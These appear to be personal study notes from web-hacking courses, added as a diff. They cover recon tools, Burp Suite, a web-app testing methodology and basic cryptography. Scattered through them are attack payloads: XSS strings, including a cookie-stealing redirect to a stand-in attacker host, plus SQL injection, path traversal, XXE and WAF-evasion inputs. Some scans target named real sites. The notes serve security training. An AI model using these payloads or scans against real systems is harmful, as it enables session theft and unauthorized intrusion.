@@ -1,0 +1,1387 @@
+ Hacking course
+
+HACKERONE
+
+Vega Web Vulnerablity scanner - Subgraph OS
+download, unzip, run Vega
+
+google 
+site:paypal.com -inurl:www -inul:sho
+You can use symbols or words in your search to make your search results more precise.
+
+Put @ in front of a word to search social media. For example: @twitter.
+Search for a price. Put $ in front of a number. For example: camera $400.
+Search hashtags. Put # in front of a word. For example: #throwbackthursday
+Exclude words from your search. Put - in front of a word you want to leave out. For example, jaguar speed -car
+Search for an exact match. Put a word or phrase inside quotes. For example, "tallest building".
+Search for wildcards or unknown words. Put a * in your word or phrase where you want to leave a placeholder. For example, "largest * in the world".
+Search within a range of numbers. Put .. between two numbers. For example, camera $50..$100.
+Combine searches. Put "OR" between each search query. For example,  marathon OR race.
+Search for a specific site. Put "site:" in front of a site or domain. For example, site:youtube.com or site:.gov.
+Search for related sites. Put "related:" in front of a web address you already know. For example, related:time.com.
+Get details about a site. Put "info:" in front of the site address.
+See Google’s cached version of a site. Put "cache:" in front of the site address.
+
+dnsdumpster.com - to list all sub domains
+
+recon ng - find subdomain , information collecting , python scripts. model as metasploit 
+recon-ng 
+show workspaces
+> workspaces add faceboook
+> use netcraft
+> set source facebook.com
+> show options
+> run 
+> show hosts 
+> use resolve
+> use recon/hosts-hosts/resolve
+> show options 
+> run
+> show hosts
+> use freegeoip
+> run
+> show hosts
+> use report
+> use reporting/html
+> set CREATOR je
+> set CUSTOMER 	WE
+> set FILENAME /root/facebook_subdomains
+> run
+
+knockpy - subdomains
+git clone https://github.com/guelfoweb/knock.git
+cd knock/knockpy
+python knock.py paypal.com
+
+nmap - open source network exploration and security auditing
+zenmap - GUI
+
+burp suite - 
+Proxy - add localhost, then go to browser and under advanced, network, add manual proxy  localhost 8080
+go to http://192.168.1.127/WAPP/login.phpnand type bee and any password
+go to Proxy, http history, find the login page and click on request, parameters, look at the user name and password
+look at response, raw for invalid credentials
+click on the login page and right click on send to intruder
+go to intruder, and choose the correct tab, then click on position tab, then refesh then clear, all values should be unselected 
+hight light password and click on add$, then click on payload, and add a list of words, then click on startr attack
+
+-use interceptor to analyze traffic between wesite and browser
+then go to a website and keep forwarding request
+-Spider - now spider, options
+robots.txt is a file containing urls that are not to be displayed on search results
+go to the browser and type an url
+go to the main url under target and click on add to scope, then click on filter and enable show only on scope
+Scanner - go to scanner. passive scanning checks and analyze existing trafic for vulnerabilities. active scanning it will create requests to check for vulns
+Intruder - brute force, use website bwapp (install), try different passwords brute force
+Authorization - 
+bwapp - download from itsecgames.com bee box, run on vmware workstation, or install website http://192.168.1.127/WAPP/login.php
+to install the website 
+unzip bWAPP_latest.zip -d /var/www/html
+chmod 777 /var/www/html
+chmod 777 /var/www/html/bWAPP
+vi /var/www/html/bWapp/admin/settings.php and chanage bug password for "" or empty
+service mysql start
+or yum install mariadb-server 
+yum install php-mysqli
+
+service mariadb start
+service httpd start or service start apache
+
+waplapyzer - https://wappalyzer.com add add on to browser, it display web technologies it uses
+
+firebug - add on, explore code by clicking on icon, feel free to change code
+
+hackbar - firefox add on, find and test SQL injections. XSS and SQL attacks
+
+user agent switcher - firefox add on, 
+
+sublist3r - python tool to enumerate subdomains using search engines. pen testesters, uses a bunch of technologies.
+git clone https://github.com/aboul3la/Sublist3r.git 
+python sublist3r -d www.intel.com, use other flags -b -p -v -t -e -o -h 
+
+repeater - go to a site, then click on a link, click onforward on interceptor until you see the cookie.
+copy the coockie and send to repeater, now you have a request, clic on go, now you have a reponse
+find a href with a link on the response,
+on the request. chage the cat # and sub #, then click go
+now open an xss cheat sheet www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet, finad malformed IMG tags,  <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+paste the tag after cat_name=, delete the old name or tag, click on go
+check the response to see if the website has sanitized the code
+now change <IMG """><SCRIPT>alert("XSS")</SCRIPT>"> with <SCRIPT>alert("XSS")</SCRIPT>
+if the website does not sanitize code properly, copy <SCRIPT>alert("XSS")</SCRIPT> on url ( replace id with it )
+click on forward the interceptor to get to the end of the page
+
+sequencer - identify token weaks or strong. token are cookies used to identify you each and every request. When login into a website your credentials are
+stored in tokens. 
+login to a site with user and password, click on forward until logged in, select cookie and send to sequencer
+check the cookie, and start capture to send requests to collect cookies or tokens, click on analyze now, and read results
+then click on bit level analysis, and character level analysis, save tokens
+
+go to sequencer, then manual load, load the tokens, click analyze now. Entropy is the randomness of the tokens. 
+
+Decoder - to decode the cockie. Go to a website and get the cooking and send to decoder,
+
+comparer - choose two urls and send to comparer responses, then send to requests
+
+WP scan - vulnerability scanning, blackbox, free open source 
+go to kali and start wpscan 
+wpscan -url theviadyasoath.wordpress.com or www.2tghacker.in 
+to find a wordpress site use google seach with site:wordpress site
+wpscan --url https://codex.wordpress.org
+wpscan --url https://codex.wordpress.org --enumerate u (for users)
+wpscan --url https://www.templatemonster.com 
+wpscan --url https://www.templatemonster.com --enumerate u or p
+wpscan --url https://www.templatemonster.com
+
+CMSmap - python open source CMS scanner. git clone https://github.com/Dionach/CMSmap.git
+
+XSS - 
+xss get code <SCRIPT>alert("CHINO")</SCRIPT> as username and any password
+xss post code 
+xss php code <a href="http://google.com" onclick="alert(document.cookie)">
+xss post code <? php $name = $_GET['name']; echo "welcome $name<br>"; echo <a href="http://xssattackexamples.com/">Click to download</a>"; ?>
+xss href code <script> Profile.init({username:</script><script>evil()</script>"});</script> - This will show the cookie
+xss login form code http://site.com?search=<script>location.href='http://hackers.com?sessionToken='+document.cookie;</script> 
+
+cross site scripting is the ability of executing additional arbitrary javascript
+read on conter measures for XSS
+
+SQL injections
+Drupal - applies to version less than 7.3.2
+read template injections
+
+clickjacking - techniques to trick a user into clicking on something
+to check if the site is vulnerable to clickjacing is to load the url into an iframe. to do so create a webpage
+<html>
+<head>
+<title>Clickjack test page</title>
+</head>
+<body>
+<p>website is vulneable to clickjacking</p>
+<iframe src="http://targe.site" width="500" height="500">
+</iframe>
+</body>
+</html>
+if test appears then the site is vulnerable
+use burp suite to see if the site is vulnerable. 
+
+open redirect report -
+an open redirect is a vulnerability that allows rediection to an external site bu directl calling a specific URL that could be malicious.
+
+CSRF change password - Cross Site Request Forgery
+use bwapp - select CSRF change password and anter the new password and confirm
+take a look a the URL, it will show the password, now on the URL change the password for a new one
+and login using the new password
+
+CSRF injection - when a CRLF characted is injected where it is not expected. the CRLF injection is used to split an HTTP response header
+and referred to as HTTP response spliting
+
+Shellshock - bash version 1.14 - 4.3 contain a flaw that processes commands placed after a function definition in the added environment cariable
+allowinf remote attackers to execute arbitrary code via a crafted environment whoch enables network-based exploitation
+
+SSRF - Server Side request forgery is a vulnerability that apperare when an attaker has the ability to create requests from the server
+
+full path disclousure - FDP - enables the attacker to see the path to the web root file 
+
+Insecure Cryptographic Storage - sensitive data is stored not securely
+
+Insecure Direct object references - an application provides direct access to objects based on user supplied input
+
+Authorize - bur suite plug in, you need the burp suite pro version for this
+It will tell whether authorization is by passed or enforced
+
+insecure login, enter 0' or '0' = 0, on bwap and take a look at the code, it will display user and password
+
+testing - priviledge manipulation, any time a web servre takes.deletes/modifies data the code can be chahnged to access other data
+testing - session manipulation, look at the urls for data/numbers and change it t bypass or get any data
+testing - session report - login to a website and cut/copy the cookie. Log out and clear cookies. Then  paste and create a cookie, and clear all cookies and then go back to the url.
+The cookie should have expired. uSe burp to see the cookie?
+
+Appplication login vulnerabilities; design issue, authentication, information disclosure, missing best practice, priviledge escalation.
+example. removed all disabled from every control and changed every false for true on every json request.  
+
+html injection - able to control an input point and inject arbitrary html code. 
+
+XXE- XMK External Entity. enables attackes to disclose normally protected files from a server.
+ 
+ sub domain take over. it causes dns misconfiguration so the attacker can take over. This can be done using external services 
+ like desk, squarespace, shopify, guihub, tumblr, and heroku.
+ use knockpy to list aall subdomains. 
+ 
+remote file inclusion. - RFI is the rpocess of including remote files through the exploiting of vulnerable inclusion procedures
+implemented in the application. 
+ 
+remote code execution. - ability to trigger arbitrary code execution from one mavchine to another.
+
+cookies.  login to a website, then go to preferences, privacy, history custom setting, show cookies.
+then find your cookie. Note everytime you login and log out a new cookie is created. 
+
+crt.sh cert site, type an url to subsubdomains and certificates. 
+
+buffer overlow - buffer amount of contiguous memory ser aside for storing information, like shopping cart. Data corruption can occur if the language does not check data boundaries and 
+writes more data in memory than what was was written for. Additionally extra malicious code can be executed. 
+
+Denial of Service - DOS - makes resources unavailable - look owasp-ds 3 to 8
+
+check hackerone website 
+
+HPP - http parameter poluttion - 
+
+OSINT - framework getting information from free tools or resources. Look at the website osint.com and play
+
+Methodilogy - 
+1 map application's content
+2 alanyze the application
+3 test client-side controls
+4 test the authentication mechanism
+5 test the session management mechanism
+6 test access controls
+7 test for input based vulns
+8 test for function specific input validations
+9 test fir logic flaws
+10 test for shared hosting vulnerabilities
+11 test for application server vuknerabilities
+12 miscellaneius checks
+13 follow any information leakage
+
+Map the Application
+
+
+1.Explore Visible Content
+Configure your browser to use your favorite
+integrated proxy/spidering tool.
+EX:Burp and WebScarab
+
+if you find it useful, configure your browser to
+use an extension such as IEWatch to monitor and
+analyze the HTTP and HTML content being processed
+by the browser.
+
+visiting every link and URL, submitting every
+form, and proceeding through all multistep
+functions to completion.
+
+Try browsing with JavaScript enabled and
+disabled, and with cookies enabled and disabled.
+
+If the application uses authentication,
+and you have or can create a login account.
+
+------------------------------------------------------------------
+2.Consult Public Resources:
+
+Use Internet search engines and archives (such as the Wayback Machine)
+to identify what content they have indexed and stored for your target
+application. Find subdomain
+
+-------------------------------------------------------
+3.Discover Hidden Content:
+
+handles requests for nonexistent items.
+Make some manual requests for known valid and invalid resources,
+and compare the server responses to establish an easy way to identify
+when an item does not exist.
+
+-------------------------------------------------------------------------------------
+4.Discover Default Content:
+
+Run Nikto against the web server to detect any
+default or well-known content that is present.
+Use Nikto options to maximize its effective-ness.
+For example, you can use the â€“root option to specify
+a directory
+------------------------------------------------------------------
+5.Enumerate Identifier-Specified Functions:
+
+Identify any instances where specific application functions
+are accessed bypassing an identifier of the function
+in a request parameter (for example,
+/admin.jsp?action=editUser or /main.php?func=A21 )
+---------------------------------------------------------------------------
+6.Test for Debug Parameters:
+
+Choose one or more application pages or functions where hidden debug
+parameters (such as debug=true ) may be implemented. These are most
+likely to appear in key functionality such as login, search, and fi le upload
+or download.
+
+Map the Application
+
+
+1.Explore Visible Content
+Configure your browser to use your favorite
+integrated proxy/spidering tool.
+EX:Burp and WebScarab
+
+if you find it useful, configure your browser to
+use an extension such as IEWatch to monitor and
+analyze the HTTP and HTML content being processed
+by the browser.
+
+visiting every link and URL, submitting every
+form, and proceeding through all multistep
+functions to completion.
+
+Try browsing with JavaScript enabled and
+disabled, and with cookies enabled and disabled.
+
+If the application uses authentication,
+and you have or can create a login account.
+
+------------------------------------------------------------------
+2.Consult Public Resources:
+
+Use Internet search engines and archives (such as the Wayback Machine)
+to identify what content they have indexed and stored for your target
+application.
+
+-------------------------------------------------------
+3.Discover Hidden Content:
+
+handles requests for nonexistent items.
+Make some manual requests for known valid and invalid resources,
+and compare the serverâ€™s responses to establish an easy way to identify
+when an item does not exist.
+
+-------------------------------------------------------------------------------------
+4.Discover Default Content:
+
+Run Nikto against the web server to detect any
+default or well-known content that is present.
+Use Niktoâ€™s options to maximize its effective-ness.
+For example, you can use the â€“root option to specify
+a directory
+------------------------------------------------------------------
+5.Enumerate Identifi er-Specifi ed Functions:
+
+Identify any instances where specifi c application functions
+are accessed bypassing an identifi er of the function
+in a request parameter (for example,
+/admin.jsp?action=editUser or /main.php?func=A21 )
+---------------------------------------------------------------------------
+6.Test for Debug Parameters:
+
+Choose one or more application pages or functions where hidden debug
+parameters (such as debug=true ) may be implemented. These are most
+likely to appear in key functionality such as login, search, and fi le upload
+or download.
+
+  Test Client-Side Controls
+
+
+1.Test Transmission of Data Via the Client:
+
+Locate all instances within the application where hidden form fi elds,
+cookies, and URL parameters are apparently being used to transmit
+data via the client.
+Modify the item’s value in ways that are relevant to its role in the
+application’s functionality.
+
+If the application uses the ASP.NET ViewState , test to confi rm whether
+this can be tampered with or whether it contains any sensitive information.
+----------------------------------------------------------------------------------------------
+2.Test Client-Side Controls Over User Input:
+
+Identify any cases where client-side controls such as length limits and
+JavaScript checks are used to validate user input before it is submitted
+to the server. These controls can be bypassed easily, because you can
+send arbitrary requests to the server.
+example:
+
+<form action=”order.asp” onsubmit=”return Validate(this)”>
+<input maxlength=”3” name=”quantity”>
+
+3.Test each affected input fi eld in turn by submitting input
+
+HTML form to identify any disabled elements, such as
+grayed-out submit buttons. For example:
+<input disabled=”true” name=”product”>
+------------------------------------------------------------------------------------------------------
+
+4.Test Browser Extension Components:
+
+Understand the Client Application’s Operation
+Decompile the Client
+Attach a Debugger
+Test ActiveX controls
+
+Test the Authentication Mechanism
+
+
+
+1.Test Password Quality:
+Review the application for any description of the minimum quality rules enforced on
+user passwords
+
+Attempt to set various kinds of weak passwords,
+using any self-registration or password change functions
+to establish the rules actually enforced.
+
+Establish the authentication technologies in use (for example, forms, certificates, or multifactor).
+
+Attempt to log in using different variations on this
+password, by removing the last character, by changing a
+character’s case, and by removing any special characters. If any of these
+login attempts is successful, continue experimenting systematically to
+identify what validation is actually being performed.
+---------------------------------------------------------------------------------------------
+
+2.Test for Username Enumeration:
+
+Review every detail of the server’s responses to each pair of
+requests, including the HTTP status code, any redirects, information
+displayed on-screen, any differences hidden in the HTML page source,
+and the time taken for the server to respond.
+
+
+Locate any subsidiary authentication that accepts a username, and
+determine whether it can be used for username enumeration.
+-------------------------------------------------------------------------------
+5.Test Any Account Recovery Function:
+the application contains any facility for users to regain
+control of their account if they have forgotten their credentials.
+
+If the function uses a password hint, perform the same exercise to har-
+vest a list of password hints, and identify any that appear to be easily
+guessable.
+
+-------------------------------------------------------------------------
+
+6.Test Any Remember Me Function
+Test Any Impersonation Function
+Test Username Uniqueness
+Test Predictability of Autogenerated Credentials
+Check for Unsafe Transmission of Credential
+Check for Unsafe Distribution of Credentials
+Test for Insecure Storage
+
+7.Test for Logic Flaws
+Test for Fail-Open Conditions
+Test Any Multistage Mechanisms
+Exploit Any Vulnerabilities to Gain
+Unauthorized Access
+
+Test the Session Management Mechanism
+
+
+1.Test Tokens for Meaning:
+Log in as several different users at different times, and record the tokens
+received from the server. If self-registration is available and you can choose
+your username.
+Analyze the tokens you receive for any correlations that appear to be
+related to the username and other user-controllable data.
+----------------------------------------------------------------------------
+2.Test Tokens for Predictability:
+If you identify any patterns, capture a second sample of tokens using
+a different IP address and a different username. This will help you
+identify whether the same pattern is detected and whether tokens
+received in the fi rst exercise could be extrapolated to guess tokens
+received in the second.
+------------------------------------------------------------------------------------
+3.Check for Insecure Transmission of Tokens:
+
+starting with unauthenticated
+content at the start URL, proceeding through the login process, and
+then going through all the application’s functionality.
+
+
+4.If HTTP cookies are being used as the transmission mechanism for session tokens,
+verify whether the secure fl ag is set, preventing them from
+ever being transmitted over HTTP connections.
+
+If the HTTPS area of the application contains any links to HTTP URLs,
+follow these and verify whether the session token is submitted. If it is,
+determine whether it continues to be valid or is immediately terminated
+by the server.
+------------------------------------------------------------------------------------
+5.Check for Disclosure of Tokens in Logs:
+
+If they are intended for administrators only, determine
+whether any other vulnerabilities exist
+that could enable a lower-privileged user to access them.
+Identify any instances where session tokens are transmitted within the
+URL.If so, these may be transmitted in
+the Referer header when users follow any off-site links.
+----------------------------------------------------------------------------------
+6.Check Mapping of Tokens to Sessions:
+
+Log in and log out several times using the same user account, either from
+different browser processes or from different computers. Determine
+whether a new session token is issued each time, or whether the same
+token is issued every time the same account logs in.
+In this situation,there is no way to protect against concurrent logins or
+properly enforce session timeout.
+
+-------------------------------------------------------------------------------------
+7.Check for CSRF:
+If the application relies solely on HTTP cookies as its method of trans-
+mitting session tokens, it may be vulnerable to cross-site request forgery
+attacks.
+-------------------------------------------------------------------------------------
+8.Check Cookie Scope:
+If the application uses HTTP cookies to transmit session tokens (or
+any other sensitive data), review the relevant Set-Cookie headers, and
+check for any domain or path attributes used to control the scope of the
+cookies.
+------------------------------------------------------------------------
+
+Test Access Controls
+
+
+Understand the Access Control Requirements
+1.Test with Multiple Accounts:
+use a less-privileged account and attempt to access each item of this
+functionality.
+Using Burp, browse all the application’s content within one user
+context.
+
+-----------------------------------------------------------------------------
+2.Test with Limited Access:
+Many common vulnerabilities will
+be much harder to locate, because you do not know the names of the URLs,
+identifi ers, and parameters that are needed to exploit the weaknesses.
+
+Decompile all compiled clients that are present, and extract any refer-
+ences to server-side functionality.
+
+-----------------------------------------------------------------------------
+3.Test for Insecure Access Control Methods:
+Some applications implement access controls based on request
+parameters in an inherently unsafe way.
+
+Some applications base access control decisions on the HTTP Referer header.
+If HEAD is an allowed method on the site, test for insecure container-
+managed access control to URLs. Make a request using the HEAD method
+to determine whether the application permits it.
+
+Test for Input-Based Vulnerabilities
+
+
+Fuzz All Request Parameters
+
+1.Test for SQL Injection:
+
+If any database error messages were returned, investigate their meaning.
+Use the section “SQL Syntax and Error Reference” in to help
+interpret error messages on some common database platforms.
+
+If submitting a single quotation mark in the parameter causes an error
+or other anomalous behavior, submit two single quotation marks
+
+Try using common SQL string concatenator functions to construct a string
+that is equivalent to some benign input
+
+‘||’FOO
+‘+’FOO
+‘ ‘FOO
+If the application’s logic can be systematically manipulated in this way,
+it is almost certainly vulnerable to SQL injection.
+--------------------------------------------------------------------------------------------
+2.Test for XSS and Other Response Injection:
+
+Identify Refl ected Request Parameters
+Test for Refl ected XSS
+Test for HTTP Header Injection
+Test for Stored Attacks
+---------------------------------------------------------------------
+3.Test for Path Traversal:
+
+The application may be checking the fi le extension being requested
+and allowing access to only certain kinds of fi les. Try using a null byte
+or newline attack together with a known accepted fi le extension in an
+attempt to bypass the fi lter. For example:
+../../../../../boot.ini%00.jpg
+../../../../../etc/passwd%0a.jpg
+
+-------------------------------------------------------------------------------------
+4.Test for Script Injection:
+
+If the application appears to be vulnerable, verify this by injecting fur-
+ther commands specifi c to the scripting platform in use. For example,
+you can use attack payloads similar to those used when fuzzing for OS
+command injection:
+system(‘ping%20127.0.0.1’)
+---------------------------------------------------------------------------------------
+5.Test for File Inclusion:
+
+If you received any incoming HTTP connections from the target appli-
+cation’s infrastructure during your fuzzing, the application is almost
+certainly vulnerable to remote fi le inclusion. Repeat the relevant tests
+in a single-threaded and time-throttled way to determine exactly which
+parameters are causing the application to issue the HTTP requests.
+-----------------------------------------------------------------------------------------
+
+Test for Function-Specific Input Vulnerabilities
+
+1.Test for SMTP Injection:
+For each request employed in e-mail–related functionality, submit each
+of the following test strings as each parameter in turn, inserting your
+own e-mail address at the relevant position.
+
+You can use Burp Intruder
+to automate this, as described for general fuzzing. These test
+strings already have special characters URL-encoded, so do not apply
+any additional encoding to them.
+<youremail>%0aCc:<youremail>
+<youremail>%0d%0aCc:<youremail>
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>
+
+Review the results to identify any error messages the application returns.
+-----------------------------------------------------------------------------------------
+Test for Native Software Vulnerabilities:
+1.Test for Buffer Overflows
+2.Test for Integer Vulnerabilities
+3.Test for Format String Vulnerabilities
+------------------------------------------------------------------------------------------
+
+2.Test for SOAP Injection:
+Target each parameter in turn that you suspect is being processed via
+a SOAP message. Submit a rogue XML closing tag, such as </foo> . If
+no error occurs, your input is probably not being inserted into a SOAP
+message or is being sanitized in some way.
+
+SOAP message, which
+may change the application’s logic or result in a different error condition
+that may divulge information.
+--------------------------------------------------------------------------------------------------
+3.Test for LDAP Injection:
+Submit the * character. If a large number of results are returned, this is
+a good indicator that you are dealing with an LDAP query.
+
+Try entering a number of closing parentheses:
+))))))))))
+
+Having extracted the name of the parent node, use a series of conditions
+with the following form to extract all the data within the XML tree:
+substring(//parentnodename[position()=1]/child::node()[position()=1]
+/text(),1,1)=’a
+
+-------------------------------------------------------------------------------------------
+4.Test for Back-End Request Injection:
+Target a request parameter that returns a specifi c page for a specifi c
+value, and try to append a new injected parameter using various syntax,
+including the following:
+
+%26foo%3dbar (URL-encoded &foo=bar )
+%3bfoo%3dbar (URL-encoded ;foo=bar )
+%2526foo%253dbar (Double URL-encoded &foo=bar )
+
+If the application behaves as if the original parameter wee unmodified,
+there is a chance of HTTP parameter injection vulnerabilities.
+--------------------------------------------------------------------------------------
+5.Test for XXE Injection:
+
+If users are submitting XML to the server, an external entity injection
+attack may be possible. If a fi eld is known that is returned to the user,
+attempt to specify an external entity, as in the following example:
+
+POST /search/128/AjaxSearch.ashx HTTP/1.1
+Host: mdsec.net
+Content-Type: text/xml; charset=UTF-8
+Content-Length: 115
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///windows/win.ini” > ]>
+<Search><SearchTerm>&xxe;</SearchTerm></Search>
+
+
+“http://192.168.1.1:25” and monitor the page response time.
+
+. Test for Logic Flaws
+
+1.Identify the Key Attack Surface
+Logic fl aws can take a huge variety of forms and exist within any aspect
+of the application’s functionality. To ensure that probing for logic fl aws
+is feasible, you should fi rst narrow down the attack surface to a reason-
+able area for manual testing.
+
+Identify any instances of the following features:
+1. Multistage processes
+2.Critical security functions, such as login
+
+3.Transitions across trust boundaries (for example, moving from being
+4.anonymous to being self-registered to being logged in)
+5.Context-based functionality presented to a user
+6.Checks and adjustments made to transaction prices or quantities
+
+-----------------------------------------------------------------------------------------------------
+2.Test Multistage Processes:
+The sequence of stages may be accessed via a series of GET or POST
+requests for distinct URLs, or they may involve submitting different
+sets of parameters to the same URL. You may specify the stage being
+requested by submitting a function name or index within a request
+parameter.
+------------------------------------------------------------------------------------------
+3.Test Handling of Incomplete Input:
+For critical security functions within the application, which involve
+processing several items of user input and making a decision based on
+these, test the application’s resilience to requests containing incomplete
+input.
+----------------------------------------------------------------------------------------
+4.Test Transaction Logic:
+the application imposes transaction limits, test the
+effects of submitting negative values. If these are accepted, it may be
+possible to beat the limits by making large transactions in the opposite
+direction.
+
+Test for Shared Hosting Vulnerabilities
+
+
+1.Test Segregation in Shared Infrastructures:
+
+If the application is hosted in a shared infrastructure, examine the access
+mechanisms provided for customers of the shared environment to update
+and manage their content and functionality.
+
+If you can achieve command execution, SQL injection, or arbitrary fi le
+access within one application, investigate carefully whether this provides
+any way to escalate your attack to target other applications
+
+------------------------------------------------------------------------------------
+2.Test Segregation Between ASP-Hosted Applications:
+
+If the application belongs to an ASP-hosted service composed of a
+mix of shared and customized components, identify any shared com-
+ponents such as logging mechanisms, administrative functions, and
+database code components.
+--------------------------------------------------------------------------------------
+
+Test for Application Server Vulnerabilities
+
+
+1.Test for Default Credentials:
+Review the results of your application mapping exercises to identify the
+web server and other technologies in use that may contain accessible
+administrative interfaces.
+
+If you gain access to an administrative interface, review the available
+functionality and determine whether it can be used to further compro-
+mise the host and attack the main application
+------------------------------------------------------------------------------------------------
+2.Test for Default Content:
+Review the results of your Nikto scan to identify any default
+content that may be present on the server but that is not an integral part
+of the application.
+
+Use search engines and other resources such as www.exploit-db.com and
+www.osvdb.org to identify default content and functionality included
+within the technologies you know to be in use.
+
+---------------------------------------------------------------------------------------
+3.Test for Dangerous HTTP Methods:
+Use the OPTIONS method to list the HTTP methods that the server states
+are available. Note that different methods may be enabled in different
+directories. You can perform a vulnerability scan in Paros to perform
+this check.
+
+Try each reported method manually to confi rm whether it can in fact be
+used.
+--------------------------------------------------------------------------------------------
+4.Test for Proxy Functionality:
+
+Using both GET and CONNECT requests, try to use the web server as a
+proxy to connect to other servers on the Internet and retrieve content
+from them.
+
+Using both GET and CONNECT requests, attempt to connect to common
+port numbers on the web server itself by specifying 127.0.0.1 as the target
+host in the request.
+
+-------------------------------------------------------------------------------------------------
+5.Test for Virtual Hosting Misconfi guration:
+Submit GET requests to the root directory using the following:
+The correct Host header
+A bogus Host header
+
+The server’s IP address in the Host header
+No Host header (use HTTP/1.0 only)
+
+Nikto scan using the -vhost option to identify any
+default content that may have been overlooked during initial
+application mapping.
+
+
+-------------------------------------------------------------------------------------------------
+6.Test for Web Server Software Bugs:
+Review resources such as Security Focus, Bugtraq, and Full Disclosure
+to fi nd details of any recently discovered vulnerabilities that may not
+have been fi xed on your target.
+
+If the application was developed by a third party, investigate whether it
+ships with its own web server (often an open source server).
+
+If it does,investigate this for any vulnerabilities. Be aware that in this case, the
+server’s standard banner may have been modified.
+-------------------------------------------------------------------------------------------------
+7.Test for Web Application Firewalling:
+
+For all fuzzing strings and requests, use payload strings that are unlikely
+to exist in a standard signature database. Although giving examples of
+these is by defi nition impossible, avoid using /etc/passwd or /windows/
+system32/config/sam as payloads for file retrieval. Also avoid using
+terms such as <script> in an XSS attack and using alert() or xss as
+XSS payloads.
+
+
+On ASP.NET, also try submitting the parameter as a cookie. The API
+Request.Params[“foo”] will retrieve the value of a cookie named foo
+if the parameter foo is not found in the query string or message body.
+
+--------------------------------------------------------------------------------------------
+
+Test for Application Server Vulnerabilities
+
+
+1.Test for Default Credentials:
+Review the results of your application mapping exercises to identify the
+web server and other technologies in use that may contain accessible
+administrative interfaces.
+
+If you gain access to an administrative interface, review the available
+functionality and determine whether it can be used to further compro-
+mise the host and attack the main application
+------------------------------------------------------------------------------------------------
+2.Test for Default Content:
+Review the results of your Nikto scan to identify any default
+content that may be present on the server but that is not an integral part
+of the application.
+
+Use search engines and other resources such as www.exploit-db.com and
+www.osvdb.org to identify default content and functionality included
+within the technologies you know to be in use.
+
+---------------------------------------------------------------------------------------
+3.Test for Dangerous HTTP Methods:
+Use the OPTIONS method to list the HTTP methods that the server states
+are available. Note that different methods may be enabled in different
+directories. You can perform a vulnerability scan in Paros to perform
+this check.
+
+Try each reported method manually to confi rm whether it can in fact be
+used.
+--------------------------------------------------------------------------------------------
+4.Test for Proxy Functionality:
+
+Using both GET and CONNECT requests, try to use the web server as a
+proxy to connect to other servers on the Internet and retrieve content
+from them.
+
+Using both GET and CONNECT requests, attempt to connect to common
+port numbers on the web server itself by specifying 127.0.0.1 as the target
+host in the request.
+
+-------------------------------------------------------------------------------------------------
+5.Test for Virtual Hosting Misconfi guration:
+Submit GET requests to the root directory using the following:
+The correct Host header
+A bogus Host header
+
+The server’s IP address in the Host header
+No Host header (use HTTP/1.0 only)
+
+Nikto scan using the -vhost option to identify any
+default content that may have been overlooked during initial
+application mapping.
+
+
+-------------------------------------------------------------------------------------------------
+6.Test for Web Server Software Bugs:
+Review resources such as Security Focus, Bugtraq, and Full Disclosure
+to fi nd details of any recently discovered vulnerabilities that may not
+have been fi xed on your target.
+
+If the application was developed by a third party, investigate whether it
+ships with its own web server (often an open source server).
+
+If it does,investigate this for any vulnerabilities. Be aware that in this case, the
+server’s standard banner may have been modified.
+-------------------------------------------------------------------------------------------------
+7.Test for Web Application Firewalling:
+
+For all fuzzing strings and requests, use payload strings that are unlikely
+to exist in a standard signature database. Although giving examples of
+these is by defi nition impossible, avoid using /etc/passwd or /windows/
+system32/config/sam as payloads for file retrieval. Also avoid using
+terms such as <script> in an XSS attack and using alert() or xss as
+XSS payloads.
+
+
+On ASP.NET, also try submitting the parameter as a cookie. The API
+Request.Params[“foo”] will retrieve the value of a cookie named foo
+if the parameter foo is not found in the query string or message body.
+
+--------------------------------------------------------------------------------------------
+
+Follow Up Any Information Leakage:
+
+
+If you receive any unusual error messages, investigate these
+using standard search engines. You can use various advanced search
+features to narrow down your results.
+example:
+“unable to retrieve” filetype:php
+
+
+Use Google code search to locate any publicly available code that
+may be responsible for a particular error message.
+
+Search for snippets of error messages that may be hard-coded into the
+application's source code. You can also use various advanced
+search features to specify the code language and other details,
+if these are known.
+
+unable\ to\ retrieve lang:php package:mail
+
+reporting vulns, check hacker one
+
+---------------------------------------------------------------------------------------------End of hacker one
+
+THE COMPLETE CYBER SECURITY COURSE - HACKERS EXPOSED
+
+
+Security trip wires
+www.stationx.net/canarytokens/
+forum.stationx.net
+
+assets - securiyu - threats - advesaries
+
+risk = vuln * trreats * consequences
+threat landscape or model
+implement security controls to protect your assets
+security control are software, actions, processes, and technology
+what is your threat modeling abd risk assessment
+defense in depth - prevent, detect, recover
+zero knowledge system is when the provider has no knowledge of what is hosting
+search for available ready made exploit kits, or look online for the exploit
+http://contagiodump.blogspot.rs/2010/06/overview-of-exploit-packs-update.html
+IOC client - 
+vbs scripts can be embedded into programs like word
+RAT - remote access tool
+real subdomains do not have a slash on the left hand side and have the Higher Dmail level (HDL) like con or net at the right
+to check on a linm urls, right click on copy link location, then paste on notepad
+darknet versus clearnet
+tor network. the URL ends in .onion, use tor browser to reach them
+test snakerat
+http://www.nsaplayset.org/ - list tech ysed bythe gov to spy
+
+NSA Playset 
+http://www.nsaplayset.org/
+NSA ANT Catalog
+https://nsa.gov1.info/dni/nsa-ant-catalog/
+NSA Codenames
+https://cryptome.org/2014/01/nsa-codenames.htm
+
+completxity is the nemesis of security
+
+ENCYPTION - tranform plain text into cipher text
+decryption - transform cipher text into plain text
+encyption  - has algorythm (public) and key (secret)
+ciphertext = algoryth + key
+AES Advanced Encryption Srandard = Symetric Algorythm that uses one key, also DES (Data Encryption Standard) , 3DES, blowfish, RC4to6 
+
+ASYMETRIC ENCRYPTION - use public/private key. These are slow and not scalable
+Rivest Shamir adelman RSA, Eliptical Curve Cryptosystem ECC, Diffie-Hellman DH
+if you encrypt with the private key, you need the public key to decypt and viceversa. It is not possible to decrypt and encrypt with only one key
+if the sender encrypts with receivers public key, you get confidentility, that the receiver can only read the message using his private key to decrypt.  
+if the sender encrypts with his private key, you get authentication (since the receiver knows who is the sender). This is known as open message format. 
+
+Cryto systems offer authntication and confidentialty, and also integrity, BGB, winzip, 
+https using tls is a hybryd crypto system - public/private keys are using to exchange agreed keys
+
+hash functions and digital signatures - help provide authentication or legitimacy of sender/receiver
